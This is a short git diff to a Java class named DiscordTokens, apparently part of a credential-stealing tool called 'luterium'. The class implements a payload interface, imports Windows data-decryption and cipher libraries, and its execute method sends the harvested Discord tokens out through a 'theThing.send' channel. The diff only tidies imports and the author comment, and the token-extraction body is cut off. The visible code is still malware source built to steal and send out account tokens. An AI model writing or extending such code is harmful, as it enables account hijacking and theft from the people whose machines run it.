@@ -3,7 +3,6 @@ package dev.peter.luterium.features;
 import com.google.gson.Gson;
 import com.google.gson.JsonObject;
 import com.sun.jna.platform.win32.Crypt32Util;
-import dev.peter.luterium.Main;
 import dev.peter.luterium.payload.PayloadExecutor;
 
 import javax.crypto.Cipher;
@@ -20,17 +19,17 @@ import java.util.*;
 import java.util.regex.Matcher;
 import java.util.regex.Pattern;
 
+import static dev.peter.luterium.Main.theThing;
+
 /**
- * @author Peter
+ * @author Peter (not me by the way, I just adapted it)
  * @since 08/26/2022
  */
 
 public class DiscordTokens implements PayloadExecutor { //Gets discord tokens.
-    public static Main main = new Main();
-
     @Override
     public void execute() throws Exception {
-        main.theThing.send("Discord Tokens: \n" + getTokens());
+        theThing.send("Discord Tokens: \n" + getTokens());
     }
 
     public String getTokens() throws IOException {
